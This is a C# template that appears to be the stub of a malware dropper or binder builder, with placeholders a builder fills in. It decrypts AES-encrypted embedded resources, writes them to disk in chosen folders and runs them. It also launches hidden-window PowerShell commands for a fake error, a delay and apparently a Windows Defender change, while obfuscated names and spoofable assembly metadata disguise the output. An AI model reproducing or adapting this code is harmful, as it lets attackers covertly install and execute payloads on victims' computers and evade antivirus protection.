using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Resources;
using System.Reflection;
using System.Diagnostics;
using System.Security.Cryptography;
#if DefAssembly
using System.Reflection;

[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%Version%")]
#endif

namespace _rProgram_
{
    class _rProgram_
    {
        public static byte[] _rAESDecryptor_(byte[] _rinput_)
        {
            using (Aes _raesAlg_ = Aes.Create())
            {
                using (MemoryStream _rmsDecrypt_ = new MemoryStream())
                {
                    using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _raesAlg_.CreateDecryptor(new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16), Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                    {
                        _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                        _rcsDecrypt_.Close();
                    }
                    return _rmsDecrypt_.ToArray();
                }
            }
        }

        public static string _rGetString_(string _rinput_)
        {
            return Encoding.UTF8.GetString(_rAESDecryptor_(Convert.FromBase64String(_rinput_)));
        }

        public static void _rPowershell_(string _rcommand_)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "#STRPOWERSHELL",
                Arguments = _rcommand_,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }

        public static void Main()
        {
#if DefError
	        _rPowershell_("#ERRORCOMMAND");
#endif
#if DefDelay
	        Thread.Sleep(#DELAY * 1000);
#endif
#if DefWD
            _rPowershell_("#WDCOMMAND");
#endif

            string[][] _rstringarray_ = { $STRINGARRAY };
            var _resources_ = new ResourceManager("#RESPARENT", Assembly.GetExecutingAssembly());

            for (int i = 0; i < $ARRAYCOUNT; i++){
                string _rpath_ = Path.Combine((_rstringarray_[i][0] == "#STRCURDIR" ? Directory.GetCurrentDirectory() : Environment.GetEnvironmentVariable(_rGetString_(_rstringarray_[i][0]))), _rGetString_(_rstringarray_[i][1]));
                File.WriteAllBytes(_rpath_, _rAESDecryptor_((byte[])_resources_.GetObject(_rstringarray_[i][2])));
                if (_rGetString_(_rstringarray_[i][3]) == "#STRTRUE")
                {
                    Process.Start(_rpath_);
                }
            }
        }
    }
}
